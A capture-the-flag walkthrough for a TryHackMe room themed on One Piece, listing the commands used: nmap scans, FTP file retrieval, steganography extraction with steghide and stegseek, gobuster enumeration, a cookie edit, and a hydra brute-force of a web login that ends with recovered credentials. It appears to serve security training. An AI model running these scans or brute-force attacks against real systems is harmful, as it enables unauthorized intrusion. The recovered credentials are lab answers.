# One Piece

**Room Link:** [https://tryhackme.com/r/room/ctfonepiece65](https://tryhackme.com/r/room/ctfonepiece65)



## **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (922).png" alt=""><figcaption></figcaption></figure>



Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (927).png" alt=""><figcaption></figcaption></figure>



## TCP/21 - **FTP**

**Kali**

```
ftp $VICTIM 21
```

**Kali(ftp)**

```
ls -lah
binary
passive
get welcome.txt
cd .the_whale_tree
get .road_poneglyph.jpeg
get .secret_room.txt
```

**Kali**

```
cat welcome.txt
cat .secret_room.txt
```

<figure><img src="../../.gitbook/assets/image (923).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (929).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
steghide extract -sf .road_poneglyph.jpeg
cat road_poneglyphe1.txt
```

<figure><img src="../../.gitbook/assets/image (930).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (931).png" alt=""><figcaption></figcaption></figure>

##

## **TCP/80 - HTTP**

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (925).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (924).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (932).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
gobuster dir -u http://$VICTIM -w LogPose.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

**CSS**

<figure><img src="../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (938).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
strings king_kong_gun.jpg  
```

<figure><img src="../../.gitbook/assets/image (939).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
strings ko.jpg  
```

<figure><img src="../../.gitbook/assets/image (941).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (943).png" alt=""><figcaption></figcaption></figure>

Just deleted the No from the cookie

<figure><img src="../../.gitbook/assets/image (944).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (946).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (947).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (948).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (949).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
Download deb file from: https://github.com/RickdeJager/stegseek/releases

sudo apt install ./stegseek_0.6-1.deb
stegseek --crack -sf kaido.jpeg -wl /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (950).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (951).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (952).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l K1ng_0f_th3_B3@sts -P /usr/share/wordlists/rockyou.txt $VICTIM http-post-form "/0n1g4sh1m4.php:user=^USER^&password=^PASS^&submit_creds=Login:ERROR" -V      
```

<figure><img src="../../.gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
Username: K1ng_0f_th3_B3@sts
Password: thebeat
```

<figure><img src="../../.gitbook/assets/image (955).png" alt=""><figcaption></figcaption></figure>



